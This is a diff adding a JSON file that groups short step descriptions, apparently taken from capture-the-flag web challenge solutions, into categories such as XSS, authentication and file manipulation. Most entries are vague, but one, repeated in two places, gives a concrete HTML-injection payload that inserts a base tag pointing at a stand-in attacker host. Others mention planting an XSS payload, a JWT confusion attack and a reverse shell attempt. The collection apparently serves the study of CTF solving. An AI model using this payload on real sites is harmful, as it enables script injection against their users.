@@ -1,0 +1,57 @@
+{
+    "Password & Authentication": [
+        "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie.",
+        "Captured incoming connections.",
+        "Retrieved table names.",
+        "Executed the payload to find the flag.",
+        "Discovered admin login page.",
+        "Double decoded the user cookie.",
+        "Concluded that a JWT confusion attack is required.",
+        "Complete the payload.",
+        "Set the settings.",
+        "Put together all obtained parts of the flag.",
+        "Explored the HTML source of the webpage."
+    ],
+    "Code Analysis & Exploitation": [
+        "Inspect the returned data.",
+        "Analyzed the PHP code in the source.",
+        "Used a redirection through a PHP server, which revealed the flag in one of the headers.",
+        "Created a crafted attack URL with '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'.",
+        "Observe flag retrieval.",
+        "Use the information obtained from the previous step.",
+        "Examined the 'if' condition that appears to determine the login logic.",
+        "Display the data in HTML to obtain the flag.",
+        "Explored the HTML source of the webpage."
+    ],
+    "Web Requests & Responses": [
+        "Extracted the jwt token from the response.",
+        "Find the flag in the source code.",
+        "Attempted to open a reverse shell.",
+        "Tried accessing a document called 'flag' in the Firestore database."
+    ],
+    "File Manipulation": [
+        "Created a .htaccess file.",
+        "Downloaded the 'pack-names' file from the target server.",
+        "Downloaded the 'last-revision' file from the target server."
+    ],
+    "XSS & Code Injection": [
+        "Create a crafted attack URL with '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'.",
+        "Started a HTTP server, created the '/static/js' directory structure, and placed XSS payload in 'marked.min.js'.",
+        "Identified the possibility of XSS in a user's profile.",
+        "Use the Runtime.evaluate method for sending the code."
+    ],
+    "Network & Server Exploration": [
+        "Capture incoming connections.",
+        "Discover website hosting on Nginx server 1.15.5."
+    ],
+    "Data Manipulation & Analysis": [
+        "Parsed the shapefile using geopandas.",
+        "Retrieved table names."
+    ],
+    "Miscellaneous": [
+        "Encounter the text 'Hello Mars!'.",
+        "Note that the tokens are associated with the current session.",
+        "Enabled 'enable_experimental_features'.",
+        "Enter 'Marathon' for Favorite Olympic Event."
+    ]
+}
